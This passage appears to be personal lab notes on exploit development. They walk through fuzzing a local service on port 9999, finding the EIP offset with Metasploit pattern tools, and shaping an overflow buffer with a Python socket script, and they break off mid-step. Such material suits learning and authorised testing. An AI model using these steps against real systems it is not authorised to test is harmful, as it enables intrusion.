# Definitions
1. EIP - Contains address of the next instruction for program or command
2. ESP - Lets you know where on the stack you are and allows you to push data in and out of the app
3. JMP - Instruction that modifies the flow of execution where the operand you designate will contain the address being jumped to
4. \x41, \x42, \x43 - hex for A, B, C

# Using ollydbg
![[Pasted image 20240618213843.png]]
- Registers (EIP/ESP) are on the right

# Skeleton Python Script
```python
#!/usr/bin/python 

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = #TBD

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```

# 1. Crash the app
- Run `fuzz.py`
- Sends \x41 (A) incrementally, 100 bytes at a time to port 9999 until it is no longer able to communicate with that port
- App stops communicating after 600 bytes
![[Pasted image 20240618223406.png]]
- See A's in ESP

# 2. Find EIP
- Identify exact number of bytes needed to fill buffer
- Use `pattern_create.rb` to create a unique string with no repeating characters
- Using the created string, input this in skeleton code under `buffer` variable

- After running new skeleton code `bof.py`, refer to ollydbg and get the EIP value
![[Pasted image 20240618224044.png]]
- Value: 35724134
- Input that value into `pattern_offset.rb` and obtain the offset. This allows us to know exactly where the buffer crashes.
```shell
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
[*] Exact match at offset 524
```

# 3. Control ESP
- Try to fill buffer with our own data to verify that we can control it
- new buffer:
```python
buffer = '\x41'*524 + '\x42'*4 + '\x43'*(600-524-4)
```
- Where:
	- EIP: '\x41 * 524' The exact number of bytes to crash (As)
	- ESP: 